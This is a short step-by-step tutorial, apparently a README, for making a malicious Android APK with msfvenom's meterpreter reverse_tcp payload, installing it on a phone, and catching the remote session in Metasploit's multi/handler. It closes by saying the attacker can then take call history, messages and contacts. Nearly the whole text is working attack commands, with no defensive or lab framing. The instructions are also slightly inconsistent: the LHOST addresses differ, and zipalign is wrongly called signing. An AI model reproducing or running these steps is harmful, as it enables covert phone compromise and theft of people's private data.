Instructions
1. Open Kali Linux and create a folder called "android" in the home directory.
2. Then go to that android folder and open a terminal there itself.
3. Now use the following command to create a payload <br>
&emsp;Command: sudo msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.205.228 LPORT=4444 R > chaithu.apk
4. Here LHOST is your Kali machine's ip address
5. Now install a tool called zipalign to sign the payload by using the following command <br>
&emsp;Command: sudo apt-get install zipalign
6. Now sign the payload by using the following command and install the application on the mobile<br>
&emsp;Command: zipalign -v 4 chaithu.apk signed_jar.apk
7. Now come to Kali Linux and open metasploit by using msfconsole and run the following commands to listen the connection from mobile <br>
&emsp;•	use exploit/multi/handler <br>
&emsp;•	set payload android/meterpreter/reverse_tcp <br>
&emsp;•	set lhost 192.168.68.130 (ip of linux) <br>
&emsp;•	set lport 4444 <br>
8. Then run the metasploit 
9. Now we can exploit the mobile and get whatever we want like call histrory, messages, contacts and many more.
